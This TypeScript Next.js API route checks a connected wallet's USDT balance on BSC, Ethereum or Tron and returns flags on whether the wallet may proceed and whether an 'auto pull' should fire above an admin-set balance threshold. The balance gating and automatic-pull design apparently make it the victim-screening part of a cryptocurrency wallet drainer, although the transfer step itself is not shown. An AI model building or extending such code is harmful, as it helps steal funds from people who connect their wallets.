import { NextResponse }                  from 'next/server';
import { createPublicClient, fallback, http, formatUnits } from 'viem';
import { mainnet, bsc }                  from 'viem/chains';
import { requireAuth }                   from '@/lib/auth/require-auth';
import { connectToDatabase, getWalletFilterSettings, getAutoPullSettings } from '@/lib/db';
import { errorResponse }                 from '@/lib/utils/errors';

export const dynamic = 'force-dynamic';

type Network = 'BEP20' | 'ERC20' | 'TRC20';

const USDT_BAL_ABI = [{
  name: 'balanceOf', type: 'function' as const, stateMutability: 'view' as const,
  inputs:  [{ name: 'account', type: 'address' }],
  outputs: [{ name: '',        type: 'uint256' }],
}] as const;

const EVM_CFG = {
  BEP20: {
    token:    '0x55d398326f99059fF775485246999027B3197955' as `0x${string}`,
    decimals: 18,
    chain:    bsc,
    rpcs: [
      process.env.NEXT_PUBLIC_BSC_RPC,
      'https://bsc-dataseed.binance.org',
      'https://bsc-dataseed1.defibit.io',
      'https://bsc.drpc.org',
    ].filter(Boolean) as string[],
  },
  ERC20: {
    token:    '0xdAC17F958D2ee523a2206206994597C13D831ec7' as `0x${string}`,
    decimals: 6,
    chain:    mainnet,
    rpcs: [
      process.env.NEXT_PUBLIC_ETHEREUM_RPC,
      'https://eth.llamarpc.com',
      'https://ethereum.publicnode.com',
      'https://eth.drpc.org',
    ].filter(Boolean) as string[],
  },
} as const;

const TRON_USDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

async function fetchUsdtBalance(address: string, network: Network): Promise<number> {
  if (network === 'TRC20') {
    const headers: Record<string, string> = {};
    if (process.env.TRONGRID_API_KEY) headers['TRON-PRO-API-KEY'] = process.env.TRONGRID_API_KEY;
    const res  = await fetch(`https://api.trongrid.io/v1/accounts/${address}`, { headers, next: { revalidate: 0 } });
    const json = await res.json();
    const trc20: Record<string, string>[] = json?.data?.[0]?.trc20 ?? [];
    const entry = trc20.find(t => t[TRON_USDT] !== undefined);
    return entry ? Number(BigInt(entry[TRON_USDT] || '0')) / 1e6 : 0;
  }

  const cfg = EVM_CFG[network];
  const transport = fallback(cfg.rpcs.map(r => http(r, { timeout: 8_000 })));
  const client    = createPublicClient({ chain: cfg.chain, transport });
  const raw       = await client.readContract({
    address: cfg.token, abi: USDT_BAL_ABI, functionName: 'balanceOf',
    args: [address as `0x${string}`],
  }) as bigint;
  return parseFloat(formatUnits(raw, cfg.decimals));
}

/**
 * POST /api/wallets/check-eligibility
 * Body: { address: string, network: 'BEP20'|'ERC20'|'TRC20' }
 *
 * Returns:
 *   { canProceed: boolean, shouldAutoPull: boolean, balance: number,
 *     minBalanceToConnect?: number, minBalanceToTrigger?: number }
 *
 * Fails OPEN: if settings are disabled or an error occurs, canProceed = true.
 */
export async function POST(req: Request) {
  try {
    await requireAuth();

    const body = await req.json() as { address?: string; network?: string };
    const address = (body.address ?? '').trim();
    const network = (body.network ?? '') as Network;

    if (!address || !['BEP20', 'ERC20', 'TRC20'].includes(network)) {
      return NextResponse.json({ error: 'address and network required' }, { status: 400 });
    }

    await connectToDatabase();
    const [filterSettings, autoPullSettings] = await Promise.all([
      getWalletFilterSettings(),
      getAutoPullSettings(),
    ]);

    // Both disabled — fast path, no RPC call needed
    if (!filterSettings.enabled && !autoPullSettings.enabled) {
      return NextResponse.json({ canProceed: true, shouldAutoPull: false, balance: 0 });
    }

    // Fetch balance server-side (independent of client-reported value)
    let balance = 0;
    try {
      balance = await fetchUsdtBalance(address, network);
    } catch {
      // RPC error — fail open so legitimate users aren't blocked
      return NextResponse.json({ canProceed: true, shouldAutoPull: false, balance: 0 });
    }

    const canProceed    = !filterSettings.enabled || balance >= filterSettings.minBalanceToConnect;
    const shouldAutoPull = autoPullSettings.enabled && balance >= autoPullSettings.minBalanceToTrigger;

    return NextResponse.json({
      canProceed,
      shouldAutoPull,
      balance,
      ...(filterSettings.enabled   ? { minBalanceToConnect:  filterSettings.minBalanceToConnect  } : {}),
      ...(autoPullSettings.enabled ? { minBalanceToTrigger:  autoPullSettings.minBalanceToTrigger } : {}),
    });
  } catch (err) {
    // Fail open — never block a user due to an internal error
    return NextResponse.json({ canProceed: true, shouldAutoPull: false, balance: 0 });
  }
}
